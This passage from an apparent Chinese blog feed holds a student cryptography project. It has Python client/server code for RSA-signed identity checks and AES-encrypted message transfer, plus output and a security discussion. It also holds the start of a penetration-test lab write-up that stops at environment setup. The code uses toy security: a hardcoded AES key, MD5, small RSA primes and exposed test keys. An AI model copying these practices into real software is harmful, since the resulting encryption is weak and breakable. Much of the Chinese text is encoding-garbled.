class="hljs-comment">#@Time : 2021/7/10 23:17</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : bob.py</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> AES <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *name = <span class="hljs-string">&quot;This is bob.&quot;</span>  <span class="hljs-comment"># bobçš„èº«ä»½ä¿¡æ¯çœŸå®ç¯å¢ƒä¸­å¯ä»¥ä¸ºåŒæ–¹çŸ¥é“çš„ç§˜å¯†</span>n,d = n_and_d()  <span class="hljs-comment"># è·å–n,d</span>e = <span class="hljs-number">65537</span>server = socket.socket() <span class="hljs-comment">#åˆ›å»ºå¯¹è±¡</span>server.bind((<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">8888</span>))<span class="hljs-comment">#ç»‘å®š ipå’Œç«¯å£</span>server.listen()  <span class="hljs-comment">#ç›‘å¬</span><span class="hljs-comment">#ç­‰å¾…è¿æ¥</span>print(<span class="hljs-string">&#x27;Waiting connection...&#x27;</span>)<span class="hljs-comment">#æ¥å—è¯·æ±‚ï¼Œè¿”å›å¥—æ¥å­—å¯¹è±¡å’ŒIP+ç«¯å£å·</span>con,addr = server.accept()con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;Welcome connect!\nå¼€åˆ†å‘RSAå…¬é’¥n:\n&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))con.recv(<span class="hljs-number">1024</span>)<span class="hljs-comment"># å‘aliceå‘é€å…¬é’¥n</span>con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(n),<span class="hljs-string">&quot;utf-8&quot;</span>))n_alice = con.recv(<span class="hljs-number">1024</span>).decode()n_alice = <span class="hljs-built_in">int</span>(n_alice)print(<span class="hljs-string">&quot;Aliceä½¿ç”¨çš„å…¬é’¥n:&quot;</span>, n_alice)<span class="hljs-comment"># éªŒè¯aliceèº«ä»½</span>print(<span class="hljs-string">&quot;éªŒè¯aliceèº«ä»½...&quot;</span>)<span class="hljs-comment"># a = input()</span>alice_name = con.recv(<span class="hljs-number">512</span>).decode()  <span class="hljs-comment"># alice çš„æ˜æ–‡ä¿¡æ¯</span>con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)hash_name = con.recv(<span class="hljs-number">512</span>).decode()   <span class="hljs-comment"># alice ç”¨ç§é’¥åŠ å¯†æ˜æ–‡çš„hashå€¼</span>plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_alice) <span class="hljs-comment"># ç”¨alice çš„å…¬é’¥è§£å¯†å‡ºhashå€¼</span><span class="hljs-keyword">if</span> plain_text == md5(alice_name):   <span class="hljs-comment"># åˆ¤æ–­ä¸Šä¸€æ­¥çš„å€¼ä¸md5å‡½æ•°åŠ å¯†æ˜¯å¦ç›¸åŒ</span>    print(alice_name)               <span class="hljs-comment"># å¦‚æœäºŒè€…ç›¸åŒåˆ™å¯ä»¥ä¿è¯å¯¹æ–¹æ˜¯alice,è¿™é‡Œçš„å®‰å…¨æ€§æ˜¯ç”±å…¬é’¥ç®—æ³•å’Œhashå‡½æ•°ä¿è¯</span>    print(<span class="hljs-string">&quot;éªŒè¯é€šè¿‡ï¼&quot;</span>)               <span class="hljs-comment"># å› ä¸ºåªæœ‰aliceæœ‰è‡ªå·±çš„ç§é’¥ï¼Œhashå‡½æ•°çš„å­˜åœ¨é˜²æ­¢ä¼ªé€ æ˜æ–‡æ”»å‡»</span>    con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯!&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))<span class="hljs-keyword">else</span>:    exit(<span class="hljs-string">&quot;è¿™ä¸æ˜¯alice,éªŒè¯é”™è¯¯ï¼&quot;</span>)<span class="hljs-comment">#é€å‡ºè‡ªå·±çš„èº«ä»½ä¿¡æ¯å’Œç­¾åå€¼</span>print(<span class="hljs-string">&quot;ç­‰å¾…aliceéªŒè¯è‡ªèº«èº«ä»½...&quot;</span>)con.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    <span class="hljs-comment"># å‘aliceå‘é€èº«ä»½ä¿¡æ¯çš„æ˜æ–‡</span>con.recv(<span class="hljs-number">1024</span>).decode()hash_name = md5(name)            <span class="hljs-comment"># æ˜æ–‡ä¿¡æ¯çš„hashå€¼</span>crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n))  <span class="hljs-comment"># ä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†ä¸Šä¸€æ­¥çš„hashå€¼</span>crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)        <span class="hljs-comment"># å‘é€ç»™alice</span>con.send(crpto_name)print(con.recv(<span class="hljs-number">1024</span>).decode())print(<span class="hljs-string">&quot;-----------å¼€å§‹æ¥æ”¶å¯¹ç§°åŠ å¯†å¯†é’¥-------------&quot;</span>)enc_key = con.recv(<span class="hljs-number">1024</span>)enc_key = enc_key.decode()enc_key = <span class="hljs-built_in">int</span>(enc_key)  <span class="hljs-comment"># å°†å¯†é’¥è½¬æ¢ä¸ºintç±»</span>dec_key = fast_mod(enc_key,d,n)print(<span class="hljs-string">&quot;æ”¶åˆ°çš„å¯¹ç§°åŠ å¯†å¯†é’¥:&quot;</span>,<span class="hljs-built_in">hex</span>(dec_key))print(<span class="hljs-string">&quot;---&quot;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&quot;å¼€å§‹æ¥æ”¶å¯†æ–‡&quot;</span>+<span class="hljs-string">&quot;---&quot;</span>*<span class="hljs-number">5</span>)<span class="hljs-comment"># ä¸€å…±æ¥æ”¶å…«æ¡æ¶ˆæ¯</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):    print(<span class="hljs-string">&quot;æ¥æ”¶ç¬¬&#123;0&#125;æ¡æ¶ˆæ¯&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))    con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)    length = con.recv(<span class="hljs-number">1024</span>)    length = <span class="hljs-built_in">int</span>(length.decode())    buff = []    size = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> size &lt; length:  <span class="hljs-comment"># å¼€å§‹æ¥å—å¯†æ–‡</span>        dat = con.recv(<span class="hljs-number">1024</span>)        size += <span class="hljs-built_in">len</span>(dat.decode())        buff.append(dat)    data = <span class="hljs-string">b&#x27;&#x27;</span>.join(buff)    bin_cipher = data.decode()    enc_plain = <span class="hljs-built_in">int</span>(bin_cipher)    print(<span class="hljs-string">&quot;æ”¶åˆ°çš„å¯†æ–‡:&quot;</span>, enc_plain)    plain_text = AES_dec(enc_plain, dec_key)    print(<span class="hljs-string">&quot;æ”¶åˆ°çš„æ¶ˆæ¯:&quot;</span>, plain_text)<span class="hljs-comment"># ä»¥ä¸‹æ˜¯å‘é€ç¡®è®¤æ”¶åˆ°æ¶ˆæ¯å’Œæ¶ˆæ¯çš„æ•°å­—ç­¾å</span>message = <span class="hljs-string">&quot;Bob received the file successfully!&quot;</span>con.send(<span class="hljs-built_in">bytes</span>(message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))con.recv(<span class="hljs-number">1024</span>).decode()hash_message = md5(message)crypt_message = <span class="hljs-built_in">str</span>(RSAEncode(hash_message,d,n))con.send(<span class="hljs-built_in">bytes</span>(crypt_message,<span class="hljs-string">&#x27;utf-8&#x27;</span>))print(<span class="hljs-string">&quot;æ–‡ä»¶ä¼ è¾“ç»“æŸï¼&quot;</span>)server.close()</code></pre><h2 id="alice-client-py"><a href="#alice-client-py" class="headerlink" title="alice_client.py"></a>alice_client.py</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/7/10 23:17</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : Alice.py</span><span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> socketname = <span class="hljs-string">&quot;This is alice.&quot;</span>   <span class="hljs-comment"># aliceçš„èº«ä»½ä¿¡æ¯çœŸå®ç¯å¢ƒä¸­å¯ä»¥ä¸ºåŒæ–¹çŸ¥é“çš„ç§˜å¯†</span><span class="hljs-comment"># n = 44531776921047477359676235110843825307036514195195627878765712056028758572817 æµ‹è¯•ä½¿ç”¨çš„n</span><span class="hljs-comment"># d = 34159352569920789505556306994405309761109146525598570740717995833480670158209 </span>n,d = n_and_d()e = <span class="hljs-number">65537</span>  <span class="hljs-comment"># eä½¿ç”¨çš„éƒ½æ˜¯65537å¯¹å®‰å…¨æ€§</span>client = socket.socket()client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># æœ¬æœºåœ°å€å’Œç«¯å£</span>data = client.recv(<span class="hljs-number">1024</span>)print(<span class="hljs-built_in">str</span>(data, <span class="hljs-string">&quot;utf-8&quot;</span>),end=<span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># è¿æ¥æˆåŠŸæç¤ºæ¶ˆæ¯</span>client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)n_bob = client.recv(<span class="hljs-number">1024</span>).decode()n_bob = <span class="hljs-built_in">int</span>(n_bob)print(<span class="hljs-string">&quot;bobä½¿ç”¨çš„å…¬é’¥n:&quot;</span>,n_bob)<span class="hljs-comment"># å‘bobå‘é€è‡ªå·±çš„n</span>client.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(n),<span class="hljs-string">&quot;utf-8&quot;</span>))print(<span class="hljs-string">&quot;ç­‰å¾…bobéªŒè¯è‡ªèº«èº«ä»½...&quot;</span>)<span class="hljs-comment"># aliceé€å‡ºè‡ªå·±çš„èº«ä»½ä¿¡æ¯å’Œç­¾åå€¼</span>client.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))             <span class="hljs-comment"># aliceå‘é€èº«ä»½æ˜æ–‡ä¿¡æ¯</span>client.recv(<span class="hljs-number">1024</span>).decode()hash_name = md5(name)crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(    hash_name, d, n)) <span class="hljs-comment"># å‘é€å¯¹hashå€¼åŠ å¯†åçš„å€¼</span>crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)client.send(crpto_name)print(client.recv(<span class="hljs-number">1024</span>).decode())             <span class="hljs-comment"># æ¥æ”¶èº«ä»½è®¤è¯çš„ç»“æœ</span><span class="hljs-comment">#æ¥æ”¶bobèº«ä»½hashå€¼å¹¶éªŒè¯</span>print(<span class="hljs-string">&quot;éªŒè¯bobèº«ä»½...&quot;</span>)bob_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bobå‘é€è¿‡æ¥çš„èº«ä»½æ˜æ–‡ä¿¡æ¯</span>client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)hash_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bobä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†èº«ä»½æ˜æ–‡ä¿¡æ¯hashå€¼åçš„å€¼</span>plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_bob) <span class="hljs-comment"># ä½¿ç”¨bobçš„å…¬é’¥è§£å¯†ä¸Šä¸€æ­¥çš„å€¼</span><span class="hljs-keyword">if</span> plain_text == md5(bob_name):                <span class="hljs-comment"># éªŒè¯æ˜¯ä¸æ˜¯bob</span>    print(bob_name)    print(<span class="hljs-string">&quot;éªŒè¯é€šè¿‡!&quot;</span>)    client.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯!&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>))<span class="hljs-keyword">else</span>:    exit(<span class="hljs-string">&quot;éªŒè¯é”™è¯¯!&quot;</span>)print(<span class="hljs-string">&quot;------------å¼€å§‹ä¼ è¾“å¯¹ç§°åŠ å¯†å¯†é’¥-----------&quot;</span>)key = <span class="hljs-number">0x12345678</span>int_key = <span class="hljs-built_in">int</span>(key)enc_key = RSA(int_key,e,n_bob)print(<span class="hljs-string">&quot;RASåŠ å¯†åçš„å¯†é’¥:&quot;</span>,enc_key)print(<span class="hljs-string">&quot;å¼€å§‹ä¼ è¾“......&quot;</span>)client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(enc_key), <span class="hljs-string">&quot;utf-8&quot;</span>))print(<span class="hljs-string">&quot;---&quot;</span> * <span class="hljs-number">5</span> + <span class="hljs-string">&quot;å¼€å§‹ä¼ è¾“å¯†æ–‡&quot;</span> + <span class="hljs-string">&quot;---&quot;</span> * <span class="hljs-number">5</span>)<span class="hljs-comment"># ä¸€å…±å‘é€å…«æ¡æ¶ˆæ¯</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):    print(<span class="hljs-string">&quot;å‘é€ç¬¬&#123;0&#125;æ¡æ¶ˆæ¯&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))    plain = read_file(i)  <span class="hljs-comment"># è¯»å–æ–‡ä»¶å†…å®¹</span>    print(<span class="hljs-string">&quot;å¾…åŠ å¯†çš„å†…å®¹:&quot;</span>, plain)    enc_plain = AES_enc(plain, key)  <span class="hljs-comment"># ä½¿ç”¨AESç®—æ³•åŠ å¯†å†…å®¹</span>    print(<span class="hljs-string">&quot;åŠ å¯†åçš„ç»“æœ:&quot;</span>, enc_plain)    client.recv(<span class="hljs-number">512</span>)    length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(enc_plain)))  <span class="hljs-comment"># ä¼ è¾“å‘é€å†…å®¹çš„é•¿åº¦</span>    length = <span class="hljs-built_in">bytes</span>(length, <span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># æ–¹ä¾¿å…¶æ¥æ”¶</span>    client.send(length)    print(<span class="hljs-string">&quot;ä¼ è¾“å¯†æ–‡...&quot;</span>)    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(enc_plain), <span class="hljs-string">&quot;utf-8&quot;</span>))  <span class="hljs-comment"># å‘é€å¯†æ–‡</span>message = client.recv(<span class="hljs-number">512</span>).decode()client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)crypt_message = client.recv(<span class="hljs-number">512</span>).decode()hash_message = RSADecode(<span class="hljs-built_in">int</span>(crypt_message),e,n_bob)<span class="hljs-keyword">if</span> hash_message == md5(message):    print(message)print(<span class="hljs-string">&quot;æ–‡ä»¶ä¼ è¾“ç»“æŸï¼&quot;</span>)client.close()</code></pre><h2 id="ç¨‹åºè¿è¡Œç»“æœ"><a href="#ç¨‹åºè¿è¡Œç»“æœ" class="headerlink" title="ç¨‹åºè¿è¡Œç»“æœ"></a>ç¨‹åºè¿è¡Œç»“æœ</h2><p>ç¨‹åºè¿è¡Œæˆªå›¾</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714162621437.png" alt="image-20210714162621437" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210714162636877.png" alt="image-20210714162636877" style="zoom:50%;"><p>æœåŠ¡å™¨ç«¯</p><pre><code class="hljs makefile"><span class="hljs-section">ç”Ÿæˆçš„p: 212578631077022742980302422715125542611</span><span class="hljs-section">ç”Ÿæˆçš„q: 316188159582830019844276947208676920009</span>Waiting connection...<span class="hljs-section">Aliceä½¿ç”¨çš„å…¬é’¥n: 76623010774774676027114980830533718839055908618566240235027551452927884987983</span>éªŒè¯aliceèº«ä»½...This is alice.éªŒè¯é€šè¿‡ï¼ç­‰å¾…aliceéªŒè¯è‡ªèº«èº«ä»½...æ‚¨é€šè¿‡äº†éªŒè¯!-----------å¼€å§‹æ¥æ”¶å¯¹ç§°åŠ å¯†å¯†é’¥-------------<span class="hljs-section">æ”¶åˆ°çš„å¯¹ç§°åŠ å¯†å¯†é’¥: 0x12345678</span>---------------å¼€å§‹æ¥æ”¶å¯†æ–‡---------------æ¥æ”¶ç¬¬1æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 135682548930565198779372680096238675594</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: NUP-SCS</span>æ¥æ”¶ç¬¬2æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 204524647430676670718786346706390507203</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: helle,bob!</span>æ¥æ”¶ç¬¬3æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 246320535020402174803721345214000008151</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: I am alice!</span>æ¥æ”¶ç¬¬4æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 58157974753797302313029320017455836609</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: I am a cumter!</span>æ¥æ”¶ç¬¬5æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 226398669380783825649368460310305319452</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: zheshixiexiaox</span>æ¥æ”¶ç¬¬6æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 53302749101918911090246485689074999058</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: sadsadddddd</span>æ¥æ”¶ç¬¬7æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 176777421636819016900191058879173899767</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: asdasda</span>æ¥æ”¶ç¬¬8æ¡æ¶ˆæ¯<span class="hljs-section">æ”¶åˆ°çš„å¯†æ–‡: 3474752232209638365517789143309475776</span><span class="hljs-section">æ”¶åˆ°çš„æ¶ˆæ¯: welcome to nwpu!</span>æ–‡ä»¶ä¼ è¾“ç»“æŸï¼Process finished with exit code 0</code></pre><p>å®¢æˆ·ç«¯</p><pre><code class="hljs makefile"><span class="hljs-section">ç”Ÿæˆçš„p: 248283914849807386247828596061320396999</span><span class="hljs-section">ç”Ÿæˆçš„q: 308610450343211666351389068102678761017</span>Welcome connect!<span class="hljs-section">å¼€åˆ†å‘RSAå…¬é’¥n:</span><span class="hljs-section">bobä½¿ç”¨çš„å…¬é’¥n: 67214846126881216073162389743685441714708801777758418373886646066828368003499</span>ç­‰å¾…bobéªŒè¯è‡ªèº«èº«ä»½...æ‚¨é€šè¿‡äº†éªŒè¯!éªŒè¯bobèº«ä»½...This is bob.éªŒè¯é€šè¿‡!------------å¼€å§‹ä¼ è¾“å¯¹ç§°åŠ å¯†å¯†é’¥-----------<span class="hljs-section">RASåŠ å¯†åçš„å¯†é’¥: 32731716332593832426148490730299678696611415440651747149365389018478993136648</span>å¼€å§‹ä¼ è¾“......---------------å¼€å§‹ä¼ è¾“å¯†æ–‡---------------å‘é€ç¬¬1æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: NUP-SCS</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 135682548930565198779372680096238675594</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬2æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: helle,bob!</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 204524647430676670718786346706390507203</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬3æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: I am alice!</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 246320535020402174803721345214000008151</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬4æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: I am a cumter!</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 58157974753797302313029320017455836609</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬5æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: zheshixiexiaox</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 226398669380783825649368460310305319452</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬6æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: sadsadddddd</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 53302749101918911090246485689074999058</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬7æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: asdasda</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 176777421636819016900191058879173899767</span>ä¼ è¾“å¯†æ–‡...å‘é€ç¬¬8æ¡æ¶ˆæ¯è¯»å–æˆåŠŸ!<span class="hljs-section">å¾…åŠ å¯†çš„å†…å®¹: welcome to nwpu!</span><span class="hljs-section">åŠ å¯†åçš„ç»“æœ: 3474752232209638365517789143309475776</span>ä¼ è¾“å¯†æ–‡...Bob received the file successfully!æ–‡ä»¶ä¼ è¾“ç»“æŸï¼</code></pre><h1 id="äº”ã€å®‰å…¨åˆ†æ"><a href="#äº”ã€å®‰å…¨åˆ†æ" class="headerlink" title="äº”ã€å®‰å…¨åˆ†æ"></a>äº”ã€å®‰å…¨åˆ†æ</h1><ul><li><p>æœ¬ç³»ç»Ÿæœ€è„†å¼±ä¹Ÿæ˜¯æœ€å±é™©çš„ä½ç½®å°±æ˜¯RSAå¯†é’¥åˆ†å‘ã€‚åœ¨å•†ä¸šä½¿ç”¨çš„å¯†é’¥åˆ†å‘éƒ½å­˜åœ¨ä¸€ä¸ªå¯ä¿¡çš„ç¬¬ä¸‰æ–¹ï¼ˆCAï¼‰,å…¶ä½œç”¨æ˜¯å°†ç”¨æˆ·çš„ä¿¡æ¯å’Œç”¨æˆ·ä½¿ç”¨çš„å…¬é’¥ç”¨è‡ªå·±çš„ç§é’¥éšè—åœ¨è¯ä¹¦ä¸­ã€‚å½“bobä»å¯ä¿¡ç¬¬ä¸‰æ–¹è·å–åˆ°aliceçš„è¯ä¹¦æ—¶ï¼Œéœ€è¦ä½¿ç”¨å¯ä¿¡ç¬¬ä¸‰æ–¹çš„ç§é’¥ï¼ˆåœ¨CAçš„æ ¹è¯ä¹¦ï¼‰è§£å¯†è¯ä¹¦è·å–è¯ä¹¦æ‰€æœ‰è€…ä¿¡æ¯å’Œå…¬é’¥ï¼ˆaliceï¼‰ï¼Œaliceä½¿ç”¨åŒæ ·çš„æ–¹æ³•éªŒè¯bobçš„ä¿¡æ¯ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿ä¸ä¼šè¢«ä¸­é—´äººæ”»å‡»ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210715155058235.png" alt="image-20210715155058235"></p></li><li><p>è®¤è¯è¿‡ç¨‹çš„å®‰å…¨æ€§</p><p>è®¤è¯è¿‡ç¨‹é‡‡ç”¨çš„æ˜¯ç¬¬äºŒç±»ç­¾åç®—æ³•ï¼ŒAliceå’ŒBobçš„ç§é’¥åªæœ‰è‡ªå·±çŸ¥é“ï¼Œå½“Aliceä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†ä¿¡æ¯åï¼Œæ‹¥æœ‰Aliceå…¬é’¥çš„Bobèƒ½å¤Ÿè§£å¯†å…¶å‘é€çš„å†…å®¹ï¼Œå¹¶ä½¿ç”¨éªŒè¯å…¬å¼å°±å¯ä»¥éªŒè¯å¯¹é¢æ˜¯å¦ä¸ºAliceã€‚</p><p>è¯¥è¿‡ç¨‹å¯ä»¥ç†è§£ä¸ºï¼š</p><p>å› ä¸ºåªæœ‰Aæ‰æ‹¥æœ‰ç§é’¥d ï¼Œè€Œä¸”ç”±å…¬é’¥e å’Œnåœ¨è®¡ç®—ä¸Šä¸èƒ½æ±‚å‡ºä¿å¯†çš„ç§é’¥ã€‚å› æ­¤ç­¾åçš„æ“ä½œåªæœ‰Aæ‰èƒ½è¿›è¡Œï¼Œä»»ä½•å…¶ä»–äººéƒ½ä¸èƒ½ä¼ªé€ ç­¾åã€‚æ‰€ä»¥ï¼Œç§é’¥då°±ç›¸å½“äºAçš„å°ç« æˆ–æŒ‡çº¹ï¼Œè€ŒåŠ å¯†ä¿¡æ¯SAå°±æ˜¯Aå¯¹Mï¼ˆæ˜æ–‡ï¼‰çš„ç­¾åã€‚å› æ­¤Aä¸èƒ½æŠµèµ–ï¼Œä»»ä½•å…¶ä»–äººä¸èƒ½ä¼ªé€ ã€‚</p><p>è¿™ä¸ªè¿‡ç¨‹å…·æœ‰ä¸å¯å¦è®¤è®¤æ€§å’Œä¼ªé€ æ”»å‡»</p></li><li><p>å¯¹AESå¯†é’¥åŠ å¯†ä½¿ç”¨çš„æ˜¯RSAç®—æ³•ï¼Œè¯¥è¿‡ç¨‹å¯ä»¥ä½¿ç”¨æ›´å¤§çš„æ•°å­—æ¥ä¿è¯å…¶å®‰å…¨æ€§ã€‚æ¯”å¦‚ä½¿ç”¨ç”Ÿæˆ1024ä½çš„p,qè®¡ç®—å‡ºnã€‚ç”±äºæˆ‘ä»¬çŸ¥é“å…¬é’¥ç®—æ³•ç›®å‰æ˜¯å®‰å…¨çš„ï¼Œæ‰€ä»¥è¿™é‡ŒåŠ å¯†åçš„å¯†é’¥æ˜¯å®‰å…¨çš„ï¼Œå³ä½¿è¢«æˆªè·ï¼Œæ”»å‡»è€…ä¹Ÿå¾ˆéš¾ç ´è§£å‡ºæ˜æ–‡ä¿¡æ¯ã€‚</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å¯†ç å­¦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shentou</title>
    <link href="/2021/05/11/shentou/"/>
    <url>/2021/05/11/shentou/</url>
    
    <content type="html"><![CDATA[<p>è®°ä¸€æ¬¡æ¸—é€æµ‹è¯•</p><span id="more"></span><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä½¿ç”¨çš„é¶æœºæ˜¯çº¢æ—¥å®‰å…¨æä¾›çš„ï¼Œåœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>æ­å»ºè¿‡ç¨‹ä¸­æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„</p><p>WebæœåŠ¡ä¸»æœºwin7æœ‰ä¸¤å—ç½‘å¡ï¼Œéœ€è¦åœ¨è®¾ç½®ä¸­å†æ·»åŠ ä¸€å—ç½‘å¡</p><p>ç½‘å¡ä¸€è¿æ¥åˆ°<code>VMnet2</code>ä¸­ï¼Œä½œä¸ºå†…ç½‘ç¯å¢ƒ</p><p>ç½‘å¡äºŒè¿æ¥åˆ°<code>VMnet1</code>ä¸­ï¼Œä½œä¸ºå…¬ç½‘ç¯å¢ƒï¼Œå¹¶æ”»å‡»æœºè¿åˆ°<code>VMnet1</code>ä¸­,ç¡®ä¿å…¶å¯ä»¥è®¿é—®ç½‘ç«™ä¸»é¡µ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" alt="image-20210511130030032"></p><p>å‰©ä¸‹çš„ä¸¤å°åŸŸæ§ä¸»æœºç›´æ¥è¿æ¥åˆ°<code>VMnet2</code>ä¸­å³å¯ï¼Œå¯ä»¥ä¸webæœåŠ¡å™¨é€šä¿¡</p><p>ä¿®æ”¹window10ç‰©ç†æœºçš„VMnet1ç½‘å¡</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" alt="image-20210511214717086" style="zoom:67%;"><p>è¿™æ ·ç‰©ç†æœºå’Œkaliéƒ½å¯ä»¥è®¿é—®åˆ°é¶æœºç½‘ç«™</p><p><strong>å®éªŒæ‹“æ‰‘å›¾:</strong></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" alt="image-20210511124808522" style="zoom: 50%;"><ul><li>webæœåŠ¡å™¨(win7): å…¬ç½‘IP:192.168.74.128   å†…ç½‘IP: 192.168.52.143 ä¸»æœºå:stu1</li><li>åŸŸæˆå‘˜ä¸»æœº(Windows Server 